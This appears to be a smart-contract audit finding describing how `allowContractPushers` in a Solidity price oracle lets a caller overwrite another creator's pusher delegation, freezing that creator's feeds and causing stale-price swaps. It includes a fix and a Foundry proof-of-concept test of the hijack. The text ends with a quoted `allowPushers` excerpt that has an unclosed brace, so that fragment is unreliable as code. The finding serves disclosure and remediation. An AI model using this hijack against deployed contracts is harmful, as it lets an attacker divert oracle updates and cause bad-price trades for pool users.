### Title
`allowContractPushers` Allows Unauthorized Namespace Hijack of an Already-Delegated Contract Pusher, Causing Feed Staleness and Bad-Price Execution - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowContractPushers` does not check whether a pusher contract is already delegated to an existing creator. Any caller whose address satisfies `pusher.isPusher(caller) == true` can overwrite an existing `namespaceRemapping[pusher]` entry, silently redirecting all future fallback pushes from the legitimate creator's namespace to the attacker's namespace. The original creator's feeds stop advancing, become stale, and any pool consuming those feeds executes swaps against a stale bid/ask price.

### Finding Description

`allowContractPushers` in `CompressedOracleV1` proves consent via a live `staticcall` to `pusher.isPusher(msg.sender)`: [1](#0-0) 

The function performs two checks before writing `namespaceRemapping[pusher] = msg.sender`:
1. `pusher != msg.sender` (no self-remapping)
2. `pusher.isPusher(msg.sender)` returns `true`

There is **no check** that `namespaceRemapping[pusher]` is currently `address(0)` (i.e., not already delegated). If a pusher contract's `isPusher` returns `true` for more than one address — which is a realistic design for shared or multi-creator pusher infrastructure — any of those addresses can call `allowContractPushers` and overwrite the existing delegation.

The fallback push path resolves the namespace from `namespaceRemapping[msg.sender]`: [2](#0-1) 

After the overwrite, every subsequent push from the pusher contract lands in the **attacker's** namespace, not the original creator's. The original creator's slot timestamps stop advancing.

The contrast with `allowPushers` (EOA path) is instructive: that function requires a deadline-bound EIP-191 signature from the pusher, explicitly because "an undated signature could re-establish a delegation AFTER the pusher revoked it": [3](#0-2) 

The contract-pusher path drops the deadline (justified because `isPusher` is a live check), but it also drops the protection against overwriting an existing delegation. The live check only proves the caller is *currently* authorized by the pusher contract; it does not prove the caller is the *current* namespace owner.

### Impact Explanation

Once the delegation is overwritten:
- The pusher contract's future `fallback()` calls write into the attacker's namespace.
- The original creator's feeds receive no further timestamp updates.
- Any `PriceProvider` or pool configured to read `feedIdOf(creator, slotIndex, positionIndex)` will observe a frozen `refTime`.
- The `_computeBidAsk` path in the price provider applies a staleness check against `refTime`; a frozen feed either reverts with `FeedStalled` or, if the staleness window is wide, returns the last stale price as a live quote.
- Swaps executing against a stale bid/ask price constitute bad-price execution — a direct allowed impact under the contest gate. [4](#0-3) 

### Likelihood Explanation

The attack requires a pusher contract whose `isPusher` returns `true` for the attacker. This is realistic in two production scenarios:

1. **Shared pusher infrastructure**: a single pusher contract is designed to serve multiple creators (e.g., a keeper network or relayer that returns `true` for any registered operator). Any registered operator can steal the delegation from the current creator.
2. **Permissive pusher contract**: a pusher contract that returns `true` for all callers (analogous to `MockPusherAllowed` in the test suite) is trivially exploitable by any EOA.

The production deployment script (`SetAllowance.sol`) calls `oracle.allowContractPushers(pushers)` with a real contract address, confirming this path is used in production: [5](#0-4) 

No privileged role is required to call `allowContractPushers`; it is fully public.

### Recommendation

Add a guard that prevents overwriting an existing delegation without the current creator's consent:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    uint256 l = pushers.length;
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];

        if (pusher == msg.sender) revert NoSelfRemapping();

        // NEW: prevent silent overwrite of an existing delegation
        address existing = namespaceRemapping[pusher];
        require(existing == address(0) || existing == msg.sender, "already delegated");

        (bool ok, bytes memory res) = pusher.staticcall(
            abi.encodeWithSignature("isPusher(address)", msg.sender)
        );
        require(ok);
        require(abi.decode(res, (bool)));

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

Alternatively, require the current creator to call `removePushers` before a new creator can claim the same pusher contract.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "../contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "../contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "../contracts/oracles/utils/U64x32.sol";

/// Shared pusher: returns true for any caller (realistic for keeper networks)
contract SharedPusher {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceHijackPoC is Test {
    CompressedOracleV1 oracle;
    SharedPusher pusherContract;

    address creator  = address(0xC0FFEE);
    address attacker = address(0xA77ACK);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusherContract = new SharedPusher();
        vm.warp(1_700_000_000);
    }

    function testHijack() public {
        // 1. Legitimate creator delegates the shared pusher.
        vm.prank(creator);
        address[] memory p = new address[](1);
        p[0] = address(pusherContract);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusherContract)), creator);

        // 2. Attacker overwrites the delegation — no signature, no creator consent.
        vm.prank(attacker);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusherContract)), attacker);

        // 3. Pusher's next push lands in ATTACKER's namespace, not creator's.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(3);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(raw) << 208;

        vm.prank(address(pusherContract));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Creator's feed is empty (stale → pools get bad price).
        IOffchainOracle.OracleData memory creatorFeed =
            oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
        assertEq(creatorFeed.price, 0, "creator feed starved");

        // Attacker's feed has the data.
        IOffchainOracle.OracleData memory attackerFeed =
            oracle.getOracleData(oracle.feedIdOf(attacker, 0, 0));
        assertGt(attackerFeed.price, 0, "attacker captured the push");
    }
}
```

The test demonstrates that after the hijack, the creator's feeds receive no further updates. Any pool pointing its `PriceProvider` at `feedIdOf(creator, ...)` will observe a stale `refTime`, leading to either a `FeedStalled` revert or stale-price execution depending on the configured staleness window.

    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
